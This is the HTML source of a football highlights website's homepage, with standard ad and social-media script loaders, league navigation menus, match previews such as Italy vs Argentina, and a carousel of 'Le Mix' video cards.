            freestar.hitTime = Date.now();
            freestar.queue = freestar.queue || [];
            freestar.config = freestar.config || {};
            freestar.debug = window.location.search.indexOf('fsdebug') === -1 ? false : true;
        </script>
        <!-- End Freestar -->

                    <script>
                freestar.queue.push(function() {
                    googletag
                        .defineSlot('/1873845/FR_WideBoard_Top', [[728, 90], [970, 250]], 'div-gpt-ad-1495531054340-0')
                        .defineSizeMapping(googletag.sizeMapping()
                            .addSize([1024, 0], [[970, 250],[728, 90]])
                            .addSize([800, 0], [728, 90])
                            .addSize([0, 0], [])
                            .build()
                        )
                        .setTargeting('url', window.location.href)
                        .addService(googletag.pubads());
                });
            </script>
        
        
        <!-- Freestar -->
        <script data-cfasync="false" type="text/javascript">
            !function(a,b){var c=b.getElementsByTagName("script")[0],d=b.createElement("script"),e="https://a.pub.network/footyroom";e+=freestar.debug?"/qa/pubfig.min.js":"/pubfig.min.js",d.async=!0,d.src=e,c.parentNode.insertBefore(d,c)}(window,document);
        </script>
        <!-- End Freestar -->

                <script type="text/javascript">
            var SITEURL = "http://footyroom.com";
            var DataStore = DataStore || {};
            
            DataStore.imagesHost = 'images.footyroom.com';
            
                            DataStore.isGuest = true;
                DataStore.noSpoilers = localStorage ? JSON.parse(localStorage.noSpoilers || false) : false;
                    </script>

        <!-- Scripts -->
        <script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
        <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.5.8/angular.min.js"></script>
        
                    <script src="http://cdn.footyroom.com/js/dist/main.min.js?ver=247"></script>
        
        	<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/1.3.5/socket.io.min.js"></script>
        
        <!-- Styles -->
                    <link rel="stylesheet" href="http://cdn.footyroom.com/css/dist/main.min.css?ver=293" type="text/css" />
                
                
        <script src="//platform.instagram.com/en_US/embeds.js"></script>

        <script type="text/javascript" src="//vk.com/js/api/openapi.js?137"></script>
        <script type="text/javascript">
          VK.init({apiId: 5835114, onlyWidgets: true});
        </script>
    </head>

    <body>
        <div id="fb-root"></div>
        <script>(function(d, s, id) {
        var js, fjs = d.getElementsByTagName(s)[0];
        if (d.getElementById(id)) return;
        js = d.createElement(s); js.id = id;
        js.src = 'https://connect.facebook.net/en_GB/sdk.js#xfbml=1&version=v2.11&appId=382400218501833';
        fjs.parentNode.insertBefore(js, fjs);
        }(document, 'script', 'facebook-jssdk'));</script>
        
        <!-- <div style="width: 100%; padding: 15px; background: floralwhite; text-align: center;">
            Our web host is experiencing network issues. They are aware of it and are currently fixing them. Same issue was causing slowdown earlier this week. Please accept our apology for the inconvenience.
        </div> -->

        <header class="sidebar" fr-click-out="hideSidebar" fr-click-out-include=".site-header-sticky" ng-class="{'is-open': isShowSidebar}">
            <div class="sidebar-scroll-area">
                <div class="sidebar-header-mask visible-xs visible-ms"></div>
                <div class="sidebar-header-dub visible-mini"></div>

                <div class="site-header-main clearfix">
                    <div class="sidebar-container">
                        <div class="site-header-sticky clearfix">
                            <a href="/" title="FootyRoom Logo" target="_self" class="pull-left">
                                <img class="header-logo hidden-sm hidden-mini" src="/pics/logo.png" />
                                <span class="icn-short-logo header-short-logo visible-sm visible-mini"></span>
                            </a>

                            <div class="headway"></div>

                            <div class="pull-right visible-xs visible-ms">
                                <span class="header-search-icon icn-search" ng-click="activateSearch()"></span>
                                <span class="hamburger" ng-click="toggleSidebar()">☰</span>
                            </div>
                        </div>

                                                    <div class="user-bar logged-out"
    ng-controller="UserBarController as ctrl"
    ng-click="ctrl.open()"
    fr-click-out="ctrl.close"
    ng-class="{opened: ctrl.isUserBarOpen}"
>
    <div class="user-main"><div class="login-text">Login or Signup</div></div>
    <div class="user-dropdown-wrap">
        <div class="user-dropdown" ng-controller="LoginController">
            <div class="error" ng-if="fbLoginError" ng-bind="fbLoginError" ng-cloak></div>
            <div class="fb-login">
                <div class="btn btn-fblogin btn-block" ng-click="fbLogin()">Login with Facebook</div>
            </div>
            <form name="login_bar_form" id="login_bar_form" class="login-form clearfix" action="/login" method="post" onsubmit="doLogin()">
                <div class="form-group">
                    <input type="text" placeholder="Username" name="username" id="login_username" class="form-control" />
                </div>
                <div class="form-group">
                    <input type="password" placeholder="Password" name="password" id="login_password" class="form-control" />
                </div>
                <input type="hidden" id="login_origin" name="login_origin" value="" />
                <input type="submit" id="login_btn" value="Log in" class="login-btn btn btn-block" class="form-control" />
            </form>
            <a href="http://footyroom.com/signup" class="user-nav-link text-center">Create new account</a>
        </div>
    </div>
</div>                        
                        <div ng-controller="NoSpoilersController as noSpoilers" class="sidebar-no-spoilers visible-xs visible-ms" ng-cloak>
                            <label class="switch no-spoilers-switch">
                                <input type="checkbox" ng-model="noSpoilers.isEnabled" ng-change="noSpoilers.change()">
                                <span class="slider"></span>
                            </label>
                            <span>No Spoilers</span>
                        </div>

                        <nav class="main-nav">
                            <ul>
                                <li class="hidden-mini"><a href="/predictor">Predictor</a></li>
                                <li><a href="http://footyroom.com/talk">Live Scores</a></li>
                                <li><a href="http://footyroom.com/forum">Forum</a></li>
                                <li class="hidden-mini"><a href="http://footyroom.com/news-center">News</a></li>
                                <li class="show-leagues visible-xs visible-ms visible-mini" data-menu="all-leagues"><a href="#">Leagues <span class="icn-tick-down"></span></a></li>
                                <li class="hidden-mini" data-menu="extras"><a>Extras <span class="icn-tick-down"></span></a></li>
                                <li class="up-anchor visible-mini hidden-xs hidden-ms"><a class="icn-circle-up"></a></li>
                            </ul>
                        </nav>
                    </div>
                </div>
                
                <div class="site-header-bar">
                    <div class="container-fr">
                        <nav class="bar-nav hidden-xs hidden-ms">
                            <ul>
                                <li class="browse">Browse:</li>
                                <li class="show-leagues" data-menu="all-leagues"><a>Leagues <span class="icn-tick-down"></span></a></li>
                                <li class="show-popular" data-menu="popular-leagues-teams"><a>Popular <span class="icn-tick-down"></span></a></li>
                                <li ng-controller="NoSpoilersController as noSpoilers" ng-cloak>
                                    <label class="switch no-spoilers-switch">
                                        <input type="checkbox" ng-model="noSpoilers.isEnabled" ng-change="noSpoilers.change()">
                                        <span class="slider"></span>
                                    </label>
                                    <span>No Spoilers</span>
                                </li>
                                <li><div style="margin: 0 15px; position: relative; top: -7px; display: inline;" class="fb-like" data-height="20px" data-width="48px" data-layout="button" data-href="http://www.facebook.com/FootyRoom" data-action="like" data-show-faces="false" data-share="false"></div></li>
                                <li class="fubotv-link displayno"><a href="http://www.fubo.tv/lp/footyroom/?irad=343747&irmp=394044"><img src="/pics/fubotv.png" style="width: 52px; height: auto; margin-top: -2px; vertical-align: middle;"></a></li>
                            </ul>
                        </nav>

                        <div class="search-bar" ng-class="{'is-active': isSearchBarActive || showSearchResult}">
                            <i class="icn-arrow-left search-back visible-xs visible-ms" ng-click="isSearchBarActive = false"></i>
                            <input type="text"
                                class="search-field"
                                ng-focus="openSearch()"
                                ng-blur="isSearchBarActive = false"
                                autocomplete="off"
                                ng-attr-placeholder="{{ isSearchBarActive ? 'Search matches and forums...' : '' }}"
                                ng-model="searchQuery"
                                ng-change="search()"
                                ng-model-options="{debounce: 200}">
                            <span class="search-bar-icon icn-search hidden-xs hidden-ms"></span>
                        </div>
                    </div>
                </div>

                <nav class="dropdown-nav wide extras clearfix" data-menu="extras">
                    <div class="sidebar-container">
                        <ul>
                            <li class="extras-item">
                                <header class="extras-header"><a href="http://footyroom.com/lemix">Le Mix</a></header>
                                <summary class="extras-summary">This is a collection of amazing videos around football</summary>
                            </li>
                            <li class="extras-item">
                                <header class="extras-header"><a href="http://footyroom.com/transfer-center">Transfers Center</a></header>
                                <summary class="extras-summary">Use this to follow player transfers. You can also check history from previous seasons (since 2009)</summary>
                            </li>
                            <li class="extras-item">
                                <header class="extras-header"><a href="http://footyroom.com/hall-of-fame">Hall of Fame</a></header>
                                <summary class="extras-summary">Profiles of greatest footballers of all time</summary>
                            </li>
                            <li class="extras-item">
                                <header class="extras-header"><a href="http://footyroom.com/legendary">Legendary Matches</a></header>
                                <summary class="extras-summary">Relive the moments of the greatest matches in history</summary>
                            </li>
                        </ul>
                    </div>
                </nav>

                <nav class="dropdown-nav all-leagues show-leagues clearfix" data-menu="all-leagues">
                    <div class="all-leagues-back visible-xs visible-ms js-close-dropdown">
                        <span class="back-span">❮ Back</span>
                    </div>
                    <section class="all-leagues-content">
                        <div class="all-leagues-column">
                            <ul class="all-leagues-section all-leagues-b-b">
                                <li class="all-leagues-header"><span class="icon country flg-gb-eng"></span> England</li>
                                <li><a href="http://footyroom.com/competitions/5/premier-league">Premier League</a></li>
                                <li><a href="http://footyroom.com/competitions/22/fa-cup">FA Cup</a></li>
                                <li><a href="http://footyroom.com/competitions/23/league-cup">League Cup</a></li>
                                <li><a href="http://footyroom.com/competitions/44/community-shield">Community Shield</a></li>
                            </ul>

                            <ul class="all-leagues-section all-leagues-b-b">
                                <li class="all-leagues-header"><span class="icon country flg-it"></span> Italy</li>
                                <li><a href="http://footyroom.com/competitions/9/serie-a">Serie A</a></li>
                                <li><a href="http://footyroom.com/competitions/27/coppa-italia">Coppa Italia</a></li>
                                <li><a href="http://footyroom.com/competitions/41/supercoppa-italiana">Supercoppa Italiana</a></li>
                            </ul>

                            <ul class="all-leagues-section">
                                <li class="all-leagues-header"><span class="icon country flg-fr"></span> <span>France</span></li>
                                <li><a href="http://footyroom.com/competitions/7/ligue-1">Ligue 1</a></li>
                                <li><a href="http://footyroom.com/competitions/29/coupe-de-la-ligue">Coupe de la Ligue</a></li>
                                <li><a href="http://footyroom.com/competitions/24/coupe-de-france">Coupe de France</a></li>
                                <li><a href="http://footyroom.com/competitions/38/trophee-des-champions">French Super Cup</a></li>
                            </ul>
                        </div>

                        <div class="all-leagues-column">
                            <ul class="all-leagues-section all-leagues-b-b">
                                <li class="all-leagues-header"><span class="icon country flg-es"></span> <span>Spain</span></li>
                                <li><a href="http://footyroom.com/competitions/19/la-liga">La Liga</a></li>
                                <li><a href="http://footyroom.com/competitions/25/copa-del-rey">Copa del Rey</a></li>
                                <li><a href="http://footyroom.com/competitions/26/supercopa-de-espana">Supercopa de Espana</a></li>
                            </ul>

                            <ul class="all-leagues-section all-leagues-b-b">
                                <li class="all-leagues-header"><span class="icon country flg-de"></span> <span>Germany</span></li>
                                <li><a href="http://footyroom.com/competitions/8/bundesliga">Bundesliga</a></li>
                                <li><a href="http://footyroom.com/competitions/39/dfb-pokal">DFB Pokal</a></li>
                                <li><a href="http://footyroom.com/competitions/53/dfl-supercup">DFL-Supercup</a></li>
                            </ul>

                            <ul class="all-leagues-section">
                                <li class="all-leagues-header"><span class="icon country flg-nl"></span> <span>Netherlands</span></li>
                                <li><a href="http://footyroom.com/competitions/10/eredivisie">Eredivisie</a></li>
                                <li><a href="http://footyroom.com/competitions/42/knvb-cup">KNVB Cup</a></li>
                                <li><a href="http://footyroom.com/competitions/43/dutch-super-cup">Dutch Super Cup</a></li>
                            </ul>
                        </div>

                        <div class="all-leagues-column international">
                            <ul class="all-leagues-section">
                                <li class="all-leagues-header"><span class="icon country flg-cint"></span> <span>International</span></li>
                                <li><a href="http://footyroom.com/competitions/20/international-friendlies">International Friendlies</a></li>
                                <li><a href="http://footyroom.com/competitions/50/club-friendlies">Club Friendlies</a></li>
                                <li><a href="http://footyroom.com/competitions/17/world-cup">World Cup</a></li>
                                <li><a href="http://footyroom.com/competitions/2811/womens-world-cup">Women's World Cup</a></li>
                                <li><a href="http://footyroom.com/competitions/47/world-cup-u-20">World Cup U-20</a></li>
                                <li><a href="http://footyroom.com/competitions/46/africa-cup-of-nations">Africa Cup of Nations</a></li>
                                <li><a href="http://footyroom.com/competitions/13/summer-olympics">Summer Olympics 2012</a></li>
                                <li><a href="http://footyroom.com/competitions/18/club-world-cup">Club World Cup</a></li>
                                <li><a href="http://footyroom.com/competitions/4/confederations-cup">Confederations Cup</a></li>
                                <li><a href="http://footyroom.com/competitions/2556/aff-suzuki-cup">AFF Suzuki Cup</a></li>
                                <li><a href="http://footyroom.com/competitions/2604/asian-cup">Asian Cup</a></li>
                                <li><a href="http://footyroom.com/competitions/51/afc-champions-league">AFC Champions League</a></li>
                                <li><a href="http://footyroom.com/competitions/49/concacaf-gold-cup">CONCACAF Gold Cup</a></li>
                                <li><a href="http://footyroom.com/competitions/48/concacaf-champions-league">CONCACAF Champions League</a></li>
                                <li><a href="http://footyroom.com/competitions/2810/copa-america">Copa America</a></li>
                            </ul>
                        </div>

                        <div class="all-leagues-column europe">
                            <ul class="all-leagues-section">
                                <li class="all-leagues-header"><span class="icon country flg-eu"></span> <span>Europe</span></li>
                                <li><a href="http://footyroom.com/competitions/3/champions-league">UEFA Champions League</a></li>
                                <li><a href="http://footyroom.com/competitions/15/europa-league">UEFA Europa League</a></li>
                                <li><a href="http://footyroom.com/competitions/16/uefa-supercup">UEFA Super Cup</a></li>
                                <li><a href="http://footyroom.com/competitions/6/euro">Euro</a></li>
                                <li><a href="http://footyroom.com/competitions/45/euro-u-21">Euro U-21</a></li>
                            </ul>
                        </div>

                        <section class="other all-leagues-column">
                            <ul class="all-leagues-section">
                                <li class="all-leagues-header">Other Leagues</li>
                                <div class="all-leagues-subsection">
                                    <li><a href="http://footyroom.com/competitions/11/primeira-liga"><span class="icon country flg-pt"></span> Primeira Liga</a></li>
                                    <li><a href="http://footyroom.com/competitions/32/taca-de-portugal"><span class="icon country flg-pt"></span> Taca de Portugal</a></li>
                                </div>
                                <div class="all-leagues-subsection">
                                    <li><a href="http://footyroom.com/competitions/14/super-lig"><span class="icon country flg-tr"></span> Süper Lig</a></li>
                                    <li><a href="http://footyroom.com/competitions/30/turkish-cup"><span class="icon country flg-tr"></span> Turkish Cup</a></li>
                                    <li><a href="http://footyroom.com/competitions/31/turkish-super-cup"><span class="icon country flg-tr"></span> Turkish Super Cup</a></li>
                                </div>
                                <div class="all-leagues-subsection">
                                    <li><a href="http://footyroom.com/competitions/12/russian-premier-league"><span class="icon country flg-ru"></span> Russian Premier League</a></li>
                                </div>
                                <div class="all-leagues-subsection">
                                    <li><a href="http://footyroom.com/competitions/21/mls"><span class="icon country flg-us"></span> Major League Soccer</a></li>
                                </div>
                            </ul>
                        </section>
                    </section>
                </nav>

                <nav class="dropdown-nav popular clearfix" data-menu="popular-leagues-teams">
                    <ul>
                        <li class="popular-section all-leagues-b-b clearfix">
                            <div class="popular-header popular-item visible-xs visible-ms">Popular Competitions</div>
                            <ul>
                                <li class="popular-item"><a href="http://footyroom.com/competitions/5/premier-league"><span class="icon country flg-gb-eng"></span> <span>Premier League</span></a></li>
                                <li class="popular-item"><a href="http://footyroom.com/competitions/19/la-liga"><span class="icon country flg-es"></span> <span>La Liga</span></a></li>
                                <li class="popular-item"><a href="http://footyroom.com/competitions/9/serie-a"><span class="icon country flg-it"></span> <span>Serie A</span></a></li>
                                <li class="popular-item"><a href="http://footyroom.com/competitions/8/bundesliga"><span class="icon country flg-de"></span> <span>Bundesliga</span></a></li>
                                <li class="popular-item"><a href="http://footyroom.com/competitions/7/ligue-1"><span class="icon country flg-fr"></span> <span>Ligue 1</span></a></li>
                                <li class="popular-item"><a href="http://footyroom.com/competitions/3/champions-league"><span class="icon country flg-uefa-cl"></span> <span>Champions League</span></a></li>
                                <li class="popular-item"><a href="http://footyroom.com/competitions/15/europa-league"><span class="icon country flg-uefa-el"></span> <span>Europa League</span></a></li>
                            </ul>
                        </li>
                        <li class="popular-section">
                            <div class="popular-header popular-item visible-xs visible-ms">Popular Teams</div>
                            <ul>
                                <li class="popular-item"><a href="/search?q=Manchester United"><span class="icon popular-team icon-popular-team-mu"></span> <span>Manchester United</span></a></li>
                                <li class="popular-item"><a href="/search?q=Chelsea"><span class="icon popular-team icon-popular-team-che"></span> <span>Chelsea</span></a></li>
                                <li class="popular-item"><a href="/search?q=Barcelona"><span class="icon popular-team icon-popular-team-fcb"></span> <span>Barcelona</span></a></li>
                                <li class="popular-item"><a href="/search?q=Real Madrid"><span class="icon popular-team icon-popular-team-rma"></span> <span>Real Madrid</span></a></li>
                                <li class="popular-item"><a href="/search?q=Arsenal"><span class="icon popular-team icon-popular-team-ars"></span> <span>Arsenal</span></a></li>
                                <li class="popular-item"><a href="/search?q=Liverpool"><span class="icon popular-team icon-popular-team-liv"></span> <span>Liverpool</span></a></li>
                                <li class="popular-item"><a href="/search?q=Juventus"><span class="icon popular-team icon-popular-team-juv"></span> <span>Juventus</span></a></li>
                                <li class="popular-item"><a href="/search?q=Bayern Munich"><span class="icon popular-team icon-popular-team-bayern"></span> <span>Bayern Munich</span></a></li>
                            </ul>
                        </li>
                    </ul>
                </nav>
            </div>
        </header>

        <div class="container-fr">
            <div class="search-dropdown clearfix" fr-click-out="closeSearch" fr-click-out-filter=".search-bar" fr-click-out-include=".search-back" ng-if="showSearchResult" ng-cloak>
                <div class="matches-search-result col-xs-12 col-sm-6 col-md-6">
                    <header class="row">Matches</header>
                    <div>
                        <a ng-repeat="matchPost in searchResult.matches" ng-href="http://footyroom.com/matches/{{matchPost.matchId}}/-/review" class="match-search-item">
                            <div class="title" ng-bind="matchPost.title"></div>
                            <div class="date">{{matchPost.date | date : 'd MMM y'}}</div>
                            <div class="league" ng-bind="matchPost.competitionName"></div>
                        </a>
                    </div>

                    <p ng-if="!searchResult.matches.length">Nope, nothing found.</p>

                    <div class="search-more text-center" ng-if="searchResult.matches.length === 10">
                        <a ng-href="http://footyroom.com/search?q={{ searchQuery }}" class="btn btn-default">See more results</a>
                    </div>
                </div>
                
                <div class="forum-search-result col-xs-12 col-sm-6 col-md-6">
                    <header class="row">Forum</header>
                    <div>
                        <a ng-repeat="post in searchResult.forums" ng-href="http://footyroom.com/forum/discussions/{{ post.slug }}-{{ post.id }}" class="forum-search-item clearfix">
                            <div class="title col-xs-10" ng-bind="post.title"></div>
                            <div class="comments-count col-xs-2">{{ post.commentCount }} <span class="icn-comments"></span></div>
                        </a>
                    </div>

                    <p ng-if="!searchResult.forums.length">Didn't find anything.</p>

                    <div class="search-more text-center" ng-if="searchResult.forums.length === 10">
                        <a ng-href="http://footyroom.com/forum?q={{ searchQuery }}" class="btn btn-default">See more results</a>
                    </div>
                </div>
            </div>
    
                                                <div class="wideBox clearfix" style="text-align: center;">
                        <!-- /1873845/FR_WideBoard_Top -->
                        <div data-cfasync="false" id='div-gpt-ad-1495531054340-0'>
                            <script>
                                freestar.queue.push(function() { googletag.display('div-gpt-ad-1495531054340-0'); });
                            </script>
                        </div>
                    </div>
                            
            	
			<div class="site-tree">
			<a href="/">Home</a><div class="separator"></div>
		</div>
	
	<div id="mainBox" class="clearfix">
			
		
		<script>
			$('.expandable').on('click', function() {
				$(this).addClass('is-expanded');
			});
		</script>

									<div id="previews">
							<div class="menu">
					<ul class="main">
						<li class="previews rbb-5px selected">Previews</li>
					</ul>
					<ul class="secondary">
													<li><a href="/previews/">More >></a></li>
											</ul>
				</div>
					
				<div class="clearfix">
											<div class="col-sm-4 col-xs-12">
							<div class="match-box">
								<a href="http://footyroom.com/matches/79946801/italy-vs-argentina/preview">
									<div class="top-part clearfix">
										<div class="team-badge"><img src="http://images.footyroom.com/badges/209"></div>
										<div class="vs">vs</div>
										<div class="team-badge"><img src="http://images.footyroom.com/badges/137"></div>
									</div>
									<div class="bottom-part clearfix">
										<div class="team-name">Italy<span class="spacer">-</span>Argentina</div>
									</div>
								</a>
							</div>
						</div>
											<div class="col-sm-4 col-xs-12">
							<div class="match-box">
								<a href="http://footyroom.com/matches/79938884/germany-vs-spain/preview">
									<div class="top-part clearfix">
										<div class="team-badge"><img src="http://images.footyroom.com/badges/191"></div>
										<div class="vs">vs</div>
										<div class="team-badge"><img src="http://images.footyroom.com/badges/283"></div>
									</div>
									<div class="bottom-part clearfix">
										<div class="team-name">Germany<span class="spacer">-</span>Spain</div>
									</div>
								</a>
							</div>
						</div>
											<div class="col-sm-4 col-xs-12">
							<div class="match-box">
								<a href="http://footyroom.com/matches/79947530/netherlands-vs-england/preview">
									<div class="top-part clearfix">
										<div class="team-badge"><img src="http://images.footyroom.com/badges/249"></div>
										<div class="vs">vs</div>
										<div class="team-badge"><img src="http://images.footyroom.com/badges/180"></div>
									</div>
									<div class="bottom-part clearfix">
										<div class="team-name">Netherlands<span class="spacer">-</span>England</div>
									</div>
								</a>
							</div>
						</div>
									</div>
			</div>
			</div>

	<div class="home-lemix full-width">
	<div class="lemix-carousel clearfix" drag-scroll>
					<div class="card col-xs-12 col-ms-6 col-md-4 card--lemix ">
	<div class="card-image">
		<a href="http://footyroom.com/lemix/top-10-goals-of-the-week-19032018-101445">
			<img src="http://images.footyroom.com/thumbs/a0f6c26be09aa7c387c9266d261bde01/saint-etienne-guingamp" />
		</a>

					<div class="card-info">
									<div class="views-count"><span class="icon"></span>5850</div>
													<div class="comments-count"><span class="icon"></span>3</div>
							</div>
			</div>
	
	<header class="card-title">
		<a href="http://footyroom.com/lemix/top-10-goals-of-the-week-19032018-101445" target="_blank" class="spoiler">Top 10 Goals of the Week [19/03/2018]</a>
		<a href="http://footyroom.com/lemix/top-10-goals-of-the-week-19032018-101445" target="_blank" class="not-spoiler">Top 10 Goals of the Week [19/03/2018]</a>
	</header>
	
			<a class="card-category" href="http://footyroom.com/lemix">Le Mix</a>
		
		<span class="card-time">Today</span>
</div>
					<div class="card col-xs-12 col-ms-6 col-md-4 card--lemix ">
	<div class="card-image">
		<a href="http://footyroom.com/lemix/have-united-players-turned-on-jose-101453">
			<img src="http://images.footyroom.com/thumbs/a36a789652e3c30c32925814dea35b24/saint-etienne-guingamp" />
		</a>

					<div class="card-info">
									<div class="views-count"><span class="icon"></span>900</div>
											</div>
			</div>
	
	<header class="card-title">
		<a href="http://footyroom.com/lemix/have-united-players-turned-on-jose-101453" target="_blank" class="spoiler">Have United Players Turned On Jose?!</a>
		<a href="http://footyroom.com/lemix/have-united-players-turned-on-jose-101453" target="_blank" class="not-spoiler">Have United Players Turned On Jose?!</a>
	</header>
	
			<a class="card-category" href="http://footyroom.com/lemix">Le Mix</a>
		
		<span class="card-time">Today</span>
</div>
					<div class="card col-xs-12 col-ms-6 col-md-4 card--lemix ">
	<div class="card-image">
		<a href="http://footyroom.com/matches/4768387/brazil-vs-germany/review">
			<img src="http://images.footyroom.com/thumbs/2ea37b44af87577f9a474c910b88bd1e/brazil-germany-lagwp" />
		</a>

					<div class="card-info">
									<div class="views-count"><span class="icon"></span>217954</div>
													<div class="comments-count"><span class="icon"></span>579</div>
							</div>
			</div>
	
	<header class="card-title">
		<a href="http://footyroom.com/matches/4768387/brazil-vs-germany/review" target="_blank" class="spoiler">Brazil 1 - 7 Germany</a>
		<a href="http://footyroom.com/matches/4768387/brazil-vs-germany/review" target="_blank" class="not-spoiler">Brazil 1 - 7 Germany</a>
	</header>
	
			<a class="card-category" href="http://footyroom.com/legendary">Legendary Matches</a>
		
		<span class="card-time">08 Jul, 2014</span>
</div>
					<div class="card col-xs-12 col-ms-6 col-md-4 card--lemix ">
	<div class="card-image">
		<a href="http://footyroom.com/lemix/the-north-korean-wonderkid-101336">
			<img src="http://images.footyroom.com/thumbs/2d2f0125df26356e16a8bc706a7f045f/amiens-troyes" />
		</a>

					<div class="card-info">
									<div class="views-count"><span class="icon"></span>7350</div>
											</div>
			</div>
	
	<header class="card-title">
		<a href="http://footyroom.com/lemix/the-north-korean-wonderkid-101336" target="_blank" class="spoiler">The North Korean Wonderkid</a>
		<a href="http://footyroom.com/lemix/the-north-korean-wonderkid-101336" target="_blank" class="not-spoiler">The North Korean Wonderkid</a>
	</header>
	
			<a class="card-category" href="http://footyroom.com/lemix">Le Mix</a>
		
		<span class="card-time">3 days ago</span>
</div>
					<div class="card col-xs-12 col-ms-6 col-md-4 card--lemix ">
	<div class="card-image">
		<a href="http://footyroom.com/lemix/10-football-clubs-owned-by-countries-101269">
			<img src="http://images.footyroom.com/thumbs/231f479767656bf51f5c0e51bcca31a1/cd-guadalajara-seattle-sounders-fc" />
		</a>

					<div class="card-info">
									<div class="views-count"><span class="icon"></span>2700</div>
											</div>
			</div>
	
	<header class="card-title">
		<a href="http://footyroom.com/lemix/10-football-clubs-owned-by-countries-101269" target="_blank" class="spoiler">10 Football Clubs OWNED By Countries!</a>
		<a href="http://footyroom.com/lemix/10-football-clubs-owned-by-countries-101269" target="_blank" class="not-spoiler">10 Football Clubs OWNED By Countries!</a>
	</header>
	
			<a class="card-category" href="http://footyroom.com/lemix">Le Mix</a>
		
		<span class="card-time">5 days ago</span>
</div>
					<div class="card col-xs-12 col-ms-6 col-md-4 card--lemix ">
	<div class="card-image">
		<a href="http://footyroom.com/lemix/real-madrid-to-sell-four-superstars-101251">
			<img src="http://images.footyroom.com/thumbs/c5d805702306f50d9edaacfeeafeb293/scotland-u21-italy-u21" />
		</a>

					<div class="card-info">
									<div class="views-count"><span class="icon"></span>3750</div>
													<div class="comments-count"><span class="icon"></span>1</div>
							</div>
			</div>
	
	<header class="card-title">
		<a href="http://footyroom.com/lemix/real-madrid-to-sell-four-superstars-101251" target="_blank" class="spoiler">Real Madrid To Sell Four Superstars!</a>
		<a href="http://footyroom.com/lemix/real-madrid-to-sell-four-superstars-101251" target="_blank" class="not-spoiler">Real Madrid To Sell Four Superstars!</a>
	</header>
	
			<a class="card-category" href="http://footyroom.com/lemix">Le Mix</a>
		
		<span class="card-time">6 days ago</span>
</div>
					<div class="card col-xs-12 col-ms-6 col-md-4 card--lemix ">
	<div class="card-image">
		<a href="http://footyroom.com/lemix/footballers-who-choke-in-big-games-xi-101233">
			<img src="http://images.footyroom.com/thumbs/6a4cef469a54cf38ed5f801e40811d23/lyon-caen" />
		</a>

					<div class="card-info">
									<div class="views-count"><span class="icon"></span>2100</div>
													<div class="comments-count"><span class="icon"></span>2</div>
							</div>
			</div>
	
	<header class="card-title">
		<a href="http://footyroom.com/lemix/footballers-who-choke-in-big-games-xi-101233" target="_blank" class="spoiler">Footballers Who CHOKE In Big Games XI!</a>
		<a href="http://footyroom.com/lemix/footballers-who-choke-in-big-games-xi-101233" target="_blank" class="not-spoiler">Footballers Who CHOKE In Big Games XI!</a>
	</header>
	
			<a class="card-category" href="http://footyroom.com/lemix">Le Mix</a>
		
		<span class="card-time">7 days ago</span>
</div>
					<div class="card col-xs-12 col-ms-6 col-md-4 card--lemix ">
	<div class="card-image">
		<a href="http://footyroom.com/lemix/is-kanes-season-over-after-injury-101217">
			<img src="http://images.footyroom.com/thumbs/e8403eb8621d3f8ee0358a6937a12831/ural-lokomotiv-moscow" />
		</a>

					<div class="card-info">
									<div class="views-count"><span class="icon"></span>3450</div>
													<div class="comments-count"><span class="icon"></span>2</div>
							</div>
			</div>
	
	<header class="card-title">
		<a href="http://footyroom.com/lemix/is-kanes-season-over-after-injury-101217" target="_blank" class="spoiler">Is Kane&#039;s Season OVER After Injury?!</a>
		<a href="http://footyroom.com/lemix/is-kanes-season-over-after-injury-101217" target="_blank" class="not-spoiler">Is Kane&#039;s Season OVER After Injury?!</a>
	</header>
	
			<a class="card-category" href="http://footyroom.com/lemix">Le Mix</a>
		
		<span class="card-time">8 days ago</span>
</div>
					<div class="card col-xs-12 col-ms-6 col-md-4 card--lemix ">
	<div class="card-image">
		<a href="http://footyroom.com/lemix/top-10-goals-of-the-week-12032018-101209">
			<img src="http://images.footyroom.com/thumbs/80c9b62612b7bdb598ff46f0a57fdc2d/maritimo-vitoria-de-setubal" />
		</a>

					<div class="card-info">
									<div class="views-count"><span class="icon"></span>7350</div>
													<div class="comments-count"><span class="icon"></span>6</div>
							</div>
			</div>
	
	<header class="card-title">
		<a href="http://footyroom.com/lemix/top-10-goals-of-the-week-12032018-101209" target="_blank" class="spoiler">Top 10 Goals of the Week [12/03/2018]</a>
		<a href="http://footyroom.com/lemix/top-10-goals-of-the-week-12032018-101209" target="_blank" class="not-spoiler">Top 10 Goals of the Week [12/03/2018]</a>
	</header>
	
			<a class="card-category" href="http://footyroom.com/lemix">Le Mix</a>
		
		<span class="card-time">8 days ago</span>
</div>
					<div class="card col-xs-12 col-ms-6 col-md-4 card--lemix ">
	<div class="card-image">
		<a href="http://footyroom.com/lemix/city-to-be-banned-from-transfers-for-2-years-101095">
			<img src="http://images.footyroom.com/thumbs/d4f238c5278b62991b52f3ff4005cbe9/fc-utrecht-vitesse" />
		</a>

					<div class="card-info">
									<div class="views-count"><span class="icon"></span>8550</div>
													<div class="comments-count"><span class="icon"></span>1</div>
							</div>
			</div>
	
	<header class="card-title">
		<a href="http://footyroom.com/lemix/city-to-be-banned-from-transfers-for-2-years-101095" target="_blank" class="spoiler">City To Be BANNED From Transfers For 2 Years!</a>
		<a href="http://footyroom.com/lemix/city-to-be-banned-from-transfers-for-2-years-101095" target="_blank" class="not-spoiler">City To Be BANNED From Transfers For 2 Years!</a>
	</header>
	
			<a class="card-category" href="http://footyroom.com/lemix">Le Mix</a>
		
		<span class="card-time">10 days ago</span>
</div>
					<div class="card col-xs-12 col-ms-6 col-md-4 card--lemix ">
	<div class="card-image">
		<a href="http://footyroom.com/lemix/10-transfers-that-ruined-a-career-101053">
			<img src="http://images.footyroom.com/thumbs/4e6529787091340c255cff8c9ac79179/kawasaki-frontale-melbourne-victory" />
		</a>

					<div class="card-info">
									<div class="views-count"><span class="icon"></span>6150</div>
													<div class="comments-count"><span class="icon"></span>2</div>
							</div>
			</div>
	
	<header class="card-title">
		<a href="http://footyroom.com/lemix/10-transfers-that-ruined-a-career-101053" target="_blank" class="spoiler">10 Transfers That RUINED A Career!</a>
		<a href="http://footyroom.com/lemix/10-transfers-that-ruined-a-career-101053" target="_blank" class="not-spoiler">10 Transfers That RUINED A Career!</a>
	</header>
	
			<a class="card-category" href="http://footyroom.com/lemix">Le Mix</a>
		
		<span class="card-time">12 days ago</span>
</div>
